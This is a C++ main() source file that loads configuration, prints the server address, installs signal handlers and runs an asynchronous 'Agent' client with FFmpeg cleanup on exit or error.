#include "FeatureLibrary.h"
#include "Agent.hpp"
#include "../../config/Config.hpp"
#include "PlatformModules.h"
#include "utils/FFmpegHelper.h"

int main(int argc, char** argv) {
    setupConsole();

#ifdef _WIN32
    autoSetupTask();
#endif

    std::cout << "[Main] Loading configuration...\n";
    Config::loadConfig(argc, argv);
    std::cout << "[Main] Configuration loaded successfully.\n";
    std::cout << "[Main] Server: " << Config::SERVER_HOST << ":" << Config::SERVER_PORT << "\n";
    try {
        boost::asio::io_context io;

        boost::asio::signal_set signals(io, SIGINT, SIGTERM);
        signals.async_wait([&io](const boost::system::error_code&, int) {
            std::cout << "\n[Main] Signal received. Stopping Agent...\n";
            FFmpegHelper::cleanup();
            io.stop();
        });

        auto agent = std::make_shared<Agent>(io);
        agent->run();

        std::cout << "===========================================\n";
        std::cout << "   AGENT CLIENT STARTED - RUNNING...       \n";
        std::cout << "===========================================\n" << std::flush;

        io.run();

    } catch (const std::exception& e) {
        std::cerr << "\n[FATAL ERROR] " << e.what() << "\n";
        system("pause");
        return 1;
    } catch (...) {
        std::cerr << "\n[CRITICAL] Unknown Crash!\n";
        FFmpegHelper::cleanup();
        system("pause");
        return 1;
    }

    FFmpegHelper::cleanup();
    return 0;
}